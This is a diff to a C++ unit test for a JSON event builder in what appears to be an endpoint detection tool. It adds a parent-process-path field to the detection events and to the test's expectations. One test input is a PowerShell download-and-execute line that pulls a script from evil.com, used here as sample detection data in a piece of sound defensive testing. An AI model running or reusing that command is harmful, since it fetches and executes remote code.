@@ -121,7 +121,8 @@ int main()
             "\"ua\":\"unit-test\","
             "\"pattern\":\"IEX \\\"payload\\\"\\n中文\","
             "\"parentPid\":\"0\","
-            "\"parentProcessName\":\"\"}";
+            "\"parentProcessName\":\"\","
+            "\"parentProcessPath\":\"\"}";
 
         if (!Expect(result.compactJson == expected, "raw JSON matches legacy field order and escaping"))
             return 1;
@@ -240,6 +241,7 @@ int main()
         EventJsonBuildInput input = BaseInput();
         input.parentPid = 1234;
         input.parentProcessName = "cmd.exe";
+        input.parentProcessPath = "C:\\Windows\\System32\\cmd.exe";
         EventJsonBuildResult result = builder.BuildDetection(input);
 
         std::map<std::string, std::string> fields;
@@ -249,6 +251,9 @@ int main()
             return 1;
         if (!Expect(fields["parentProcessName"] == "cmd.exe", "parentProcessName output"))
             return 1;
+        if (!Expect(fields["parentProcessPath"] == "C:\\Windows\\System32\\cmd.exe",
+                    "parentProcessPath output"))
+            return 1;
     }
 
     // Batch 3: parentPid = 0 (empty)
@@ -257,6 +262,7 @@ int main()
         EventJsonBuildInput input = BaseInput();
         input.parentPid = 0;
         input.parentProcessName.clear();
+        input.parentProcessPath.clear();
         EventJsonBuildResult result = builder.BuildDetection(input);
 
         std::map<std::string, std::string> fields;
@@ -266,6 +272,8 @@ int main()
             return 1;
         if (!Expect(fields["parentProcessName"].empty(), "parentProcessName empty when not captured"))
             return 1;
+        if (!Expect(fields["parentProcessPath"].empty(), "parentProcessPath empty when not captured"))
+            return 1;
     }
 
     // Batch 3: parentPid = 4 (System sentinel)
@@ -274,6 +282,7 @@ int main()
         EventJsonBuildInput input = BaseInput();
         input.parentPid = 4;
         input.parentProcessName = "System";
+        input.parentProcessPath.clear();
         EventJsonBuildResult result = builder.BuildDetection(input);
 
         std::map<std::string, std::string> fields;
@@ -290,6 +299,7 @@ int main()
         EventJsonBuilder builder;
         EventJsonBuildInput input = BaseInput();
         input.parentProcessName = "process with spaces & special chars \"test\"";
+        input.parentProcessPath = "C:\\Program Files\\Parent \"Launcher\"\\parent.exe";
         EventJsonBuildResult result = builder.BuildDetection(input);
 
         std::map<std::string, std::string> fields;
@@ -297,6 +307,9 @@ int main()
             return 1;
         if (!Expect(fields["parentProcessName"] == "process with spaces & special chars \"test\"",
                     "parentProcessName preserves special chars after escape roundtrip"))
+            return 1;
+        if (!Expect(fields["parentProcessPath"] == "C:\\Program Files\\Parent \"Launcher\"\\parent.exe",
+                    "parentProcessPath preserves special chars after escape roundtrip"))
             return 1;
     }
 
@@ -320,6 +333,7 @@ int main()
         input.payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";
         input.parentPid = 5678;
         input.parentProcessName = "cmd.exe";
+        input.parentProcessPath = "C:\\Windows\\System32\\cmd.exe";
 
         EventJsonBuildResult result = builder.BuildDetection(input);
 
@@ -373,6 +387,7 @@ int main()
         input.payload = "Get-Process | Where-Object {$_.CPU -gt 100}";
         input.parentPid = 0;  // 空 parent
         input.parentProcessName = "";
+        input.parentProcessPath = "";
 
         EventJsonBuildResult result = builder.BuildDetection(input);
 
@@ -400,6 +415,7 @@ int main()
         input.payload.assign(10 * 1024, 'X');  // 超过 8KB 截断阈值
         input.parentPid = 12345;
         input.parentProcessName = "truncated_parent.exe";
+        input.parentProcessPath = "C:\\Windows\\System32\\truncated_parent.exe";
 
         EventJsonBuildResult result = builder.BuildDetection(input);
 
@@ -434,6 +450,7 @@ int main()
         input.payload = "IEX \"nested \\\"quotes\\\" and \\backslash\"";
         input.parentPid = 999;
         input.parentProcessName = "parent with \"quotes\" & \\backslash\\";
+        input.parentProcessPath = "C:\\Parent \"quoted\"\\with\\backslash.exe";
 
         EventJsonBuildResult result = builder.BuildDetection(input);
 
